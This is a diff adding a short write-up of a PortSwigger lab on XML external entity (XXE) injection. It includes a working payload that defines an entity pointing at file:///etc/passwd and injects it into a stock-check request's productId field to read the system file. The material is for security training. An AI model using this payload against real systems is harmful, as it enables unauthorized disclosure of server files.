@@ -1,0 +1,45 @@
+
+# Exploiting XXE using external entities to retrieve files
+
+This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
+
+To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.
+
+---------------------------------------------
+
+References: 
+
+- https://portswigger.net/web-security/xxe
+
+
+
+![img](images/Exploiting%20XXE%20using%20external%20entities%20to%20retrieve%20files/1.png)
+
+---------------------------------------------
+
+
+The request to check the stcok of a product uses a XML object:
+
+
+
+![img](images/Exploiting%20XXE%20using%20external%20entities%20to%20retrieve%20files/2.png)
+
+
+Tha payload used is:
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck>
+	<productId>
+		&xxe;
+	</productId>
+	<storeId>
+		1
+	</storeId>
+</stockCheck>
+```
+
+
+
+![img](images/Exploiting%20XXE%20using%20external%20entities%20to%20retrieve%20files/3.png)
